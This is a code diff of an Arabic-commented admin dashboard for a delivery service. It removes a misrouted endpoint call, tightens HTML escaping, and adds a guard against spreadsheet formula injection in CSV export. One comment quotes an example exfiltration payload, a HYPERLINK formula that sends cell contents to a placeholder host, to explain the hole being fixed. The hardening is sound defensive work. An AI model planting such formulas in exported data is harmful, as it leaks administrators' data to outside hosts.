+     payType من الكتابة») وما تفعله لوحة الليدر أصلاً (liderdodsas.html:2417
+     تُمرّر القاعدة المختومة كما هي): السيرفر يملك القيمتين، فلا تُكتبا.
+     trackDriverCompletion يتولّى المحاسبة من أي مسارٍ جاء الإنهاء.
+     ═══════════════════════════════════════════════════════════════════════ */
   const upd={};
   upd[`active_orders/${oId}/status`]="completed";
   upd[`active_orders/${oId}/completed_at`]=new Date().toISOString();
-  upd[`active_orders/${oId}/comm`]=cr.isMonthly?"شهري":(cr.res||0);
-  upd[`active_orders/${oId}/payType`]=rD?String(rD[R.PAY]||""):"";
   shadowCmd("FORCE_DELIVER",oId);   /* [V17] قياس في الظلّ */
   db.ref().update(upd).then(()=>{
     toast("✅ تم إكمال الطلب");logAudit("forceComplete","إكمال يدوي #"+oId);
@@ -2926,9 +3226,12 @@ window.asgnDrv=function(oId,dPhone,el){
     .then(r=>r.json()).then(d=>{if(d.success){toast("تم التعيين السيادي 👑");logAudit("assignDriver",`طلب #${oId} ← ${dN(dPhone)}`);}else toast("خطأ","e");})
     .catch(()=>toast("تم الإرسال")).finally(()=>el.disabled=false);
 };
-/* ملاحظة V16.0: نداء DECLINE_ORDER هنا يسجّل الرفض في daily_metrics فقط —
-   🔧[خ١٣] لم يعد يُنقص daily_count (الخصم الشرعي الوحيد في سحب الموظف
-   staffWithdrawOrder لأن الطلب هناك قُبل فعلاً وزاد العدّاد). */
+/* ملاحظة V16.0 — **بطلت في V31.3**: كانت تصف نداء DECLINE_ORDER من هذه
+   الدالّة، وقد حُذف النداء (الشرح الكامل عند موضعه أدناه). وتُترك مشطوبةً
+   لا محذوفة كي لا يُعاد إدخال النداء ظنّاً أنه ناقص:
+     ✗ «نداء DECLINE_ORDER هنا يسجّل الرفض في daily_metrics فقط»
+   والخصم الشرعي الوحيد يبقى في staffWithdrawOrder — لأن الطلب هناك قُبل
+   فعلاً وزاد العدّاد. */
 window.wdOrder=function(oId,dPhone,el){
   if(!confirm("سحب الطلب وإعادته للرادار؟"))return;
   // 🩹 [③ سباق الحالة] لا تسحب طلباً اكتمل/أُلغي للتوّ: الكتابة المباشرة كانت
@@ -2948,7 +3251,30 @@ window.wdOrder=function(oId,dPhone,el){
   ovr.o[String(oId)]={status:"pending_driver",dp:"system_routing",ts:Date.now()};
   shadowCmd("REVOKE",oId);   /* [V17] قياس في الظلّ */
   db.ref(`active_orders/${oId}`).update({status:"pending_driver",driverPhone:"system_routing",last_update:now,last_offered_to:dPhone,is_sovereign:false}).then(()=>toast("تم السحب")).catch(()=>toast("خطأ","e"));
-  fetch(`${API}?action=DECLINE_ORDER&orderId=${oId}&driverPhone=${dPhone}&token=${TOK}`).catch(()=>{});
+  /* ═══════════════════════════════════════════════════════════════════════
+     🔴 [V31.3] حُذف نداء DECLINE_ORDER من هنا — والسبب ثلاثة معاً.
+     ───────────────────────────────────────────────────────────────────────
+     ① **بوّابةُ كابتنٍ يناديها إداري.** DECLINE_ORDER هي مسار «الكابتن يرفض
+        العرض»، وهذا **سحبٌ إداري**. وللسحب بوّابته الخاصّة المنشورة أصلاً:
+        STAFF_WITHDRAW → staffWithdrawOrder (Code.gs:1681). فاللوحة كانت
+        تنتحل صفة الكابتن لتؤدّي فعلاً إدارياً.
+
+     ② **وهو يزيد عدّاد رفض الكابتن — أحياناً.** handleDeclineOrder تزيد
+        daily_metrics/<الكابتن>/<اليوم>/rejected_orders، والعدّاد يدخل
+        fairnessScore. وحارسها يشترط أن يكون driverPhone ما زال الكابتن؛
+        والسطر أعلاه يكتب system_routing. فالنتيجة **سباق**:
+            وصلت الكتابة أولاً ⇒ الحارس يردّ ولا شيء يقع
+            وصل النداء أولاً   ⇒ يُزاد رفضٌ **لكابتنٍ لم يرفض**
+        فالكابتن الذي سُحب منه الطلب يُعاقَب في توزيع الغد بلا سبب.
+
+     ③ **وهو قنبلةٌ موقوتة.** يوم تُشغّل ENFORCE_ENTITY_STOKEN يُرفض النداء
+        (بوّابتكم ترفع PROTOCOL_COUPLING عليه). ولا علاج له باللوحة: لوحة
+        الإدارة تصادق بـMP لا بجلسة كيان، فليس لها stoken أصلاً.
+
+     ولا يضيع بحذفه شيء: الكتابة أعلاه هي الفعل الحقيقي — دور admin يملك
+     صلاحيتها في القواعد — وهي التي تُعيد الطلب إلى الرادار. وخصم daily_count
+     لم يكن يقع في هذا المسار أصلاً (أُزيل من الرفض في خ١٣).
+     ═══════════════════════════════════════════════════════════════════════ */
   logAudit("withdrawOrder",`سحب #${oId} من ${dN(dPhone)}`);
 };
 
@@ -3093,7 +3419,25 @@ window.expCSV=function(){
     if(rF&&rN!==rF)return false;if(dF&&dp!==dF)return false;return true;
   });
   if(!rows.length)return toast("لا نتائج للتصدير","e");
-  const q2=v=>'"'+String(v??'').replace(/"/g,'""')+'"';
+  /* ═══════════════════════════════════════════════════════════════════════
+     🔴 [V31 · ل-٣] حقن صيغ الجداول — كان التنصيص وحده.
+     ───────────────────────────────────────────────────────────────────────
+     إكسل و«جداول جوجل» يزيلان التنصيص ثم **ينفّذان** ما بدأ بـ = + - @.
+     واسم المطعم واسم الكابتن حقلا **تسجيلٍ ذاتي** يكتبهما صاحبهما. فكابتنٌ
+     يسجّل اسمه:
+         =HYPERLINK("http://x/?"&A1,"ok")
+     يُنفَّذ في جهاز الإدارة لحظة فتح الملف المُصدَّر — ويسرّب محتوى الخلايا.
+
+     والحارس موجودٌ في النظام منذ زمن — Code.gs:653 (sanitizeForSheet):
+         return /^[=+\-@\t\r]/.test(s) ? ("'" + s) : s;
+     لكنه في GAS وحدها ولم يُنقل إلى تصدير اللوحة. (النمط نفسه.)
+
+     والفاصلة العليا البادئة تُبطل الصيغة ولا تظهر في الخلية عند الفتح. */
+  const q2=v=>{
+    let t=String(v??'');
+    if(/^[=+\-@\t\r]/.test(t)) t="'"+t;
+    return '"'+t.replace(/"/g,'""')+'"';
+  };
   let csv="\uFEFFرقم الطلب,الوقت,المطعم,الكابتن,السعر,العمولة,نظام الدفع,الحالة\n";
   rows.forEach(o=>{
     const cVal=getCommVal(o);const pT=(o[O.PAY])||(findRes(o)?.[R.PAY])||"";
@@ -3322,9 +3666,9 @@ function renderStaffList(){
       <div class="ec-acts">
         <div style="display:flex;gap:4px">
           <button class="ea ea-e" title="تقرير الأداء" onclick="opStaffPerf('${pj}')">📊</button>
-          <button class="ea ea-a" title="إعادة كلمة المرور" onclick="opStaffReset('${pj}','${esc(e.name)}')">🔑</button>
+          <button class="ea ea-a" title="إعادة كلمة المرور" onclick="opStaffReset('${pj}','${ej(e.name)}')">🔑</button>
           ${active?`<button class="ea ea-p" title="إيقاف" onclick="stSetStatus('${pj}','suspended',this)">⏸</button>`:`<button class="ea ea-a" title="تفعيل" onclick="stSetStatus('${pj}','active',this)">✓</button>`}
-          <button class="ea ea-d" title="حذف" onclick="stDelete('${pj}','${esc(e.name)}',this)">🗑</button>
+          <button class="ea ea-d" title="حذف" onclick="stDelete('${pj}','${ej(e.name)}',this)">🗑</button>
         </div>
         <button class="ea ea-c" title="اتصال" onclick="window.open('tel:${pj}')">📞</button>
       </div>
